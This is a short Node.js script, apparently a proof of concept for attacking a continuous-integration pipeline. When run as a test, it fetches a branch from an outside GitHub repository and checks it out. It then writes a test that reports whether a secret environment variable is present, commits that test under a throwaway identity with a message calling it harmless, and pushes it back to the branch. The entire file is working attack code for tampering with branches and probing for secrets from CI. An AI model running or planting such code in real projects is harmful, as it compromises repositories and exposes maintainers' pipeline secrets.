const { spawnSync } = require("node:child_process");
const { writeFileSync } = require("node:fs");

const remote = "https://github.com/just4h1poc/eve-factory-owned-poc-20261015.git";
const branch = "poc-owner-model-probe";

function git(label, args) {
  const result = spawnSync("git", ["-c", "credential.helper=", ...args], {
    encoding: "utf8",
    timeout: 30000,
    env: { ...process.env, GIT_TERMINAL_PROMPT: "0" },
  });
  console.log(label + "_EXIT=" + result.status);
  if (result.stderr) console.log(result.stderr);
  if (result.error) console.log(label + "_ERROR=" + result.error.message);
  if (result.status !== 0) process.exit(1);
  return result.stdout.trim();
}

console.log("OUTSIDER_CI_CANARY_TEST_RAN_20261015");
git("FETCH_OWNER_PR", ["fetch", remote, "refs/heads/" + branch]);
git("CHECKOUT_OWNER_PR", ["checkout", "--detach", "FETCH_HEAD"]);
writeFileSync("test.cjs", 'console.log("CI_CANARY_PRESENT=" + Boolean(process.env.POC_CANARY));\n');
git("STAGE_CANARY_TEST", ["add", "test.cjs"]);
git("COMMIT_CANARY_TEST", [
  "-c", "user.name=Owned PoC",
  "-c", "user.email=owned-poc@example.invalid",
  "commit", "-m", "Add harmless CI canary presence check",
]);
console.log("NEW_OWNER_PR_SHA=" + git("REV_PARSE", ["rev-parse", "HEAD"]));
git("PUSH_OWNER_PR", ["push", remote, "HEAD:refs/heads/" + branch]);
console.log("OWNER_PR_BRANCH_UPDATED=1");
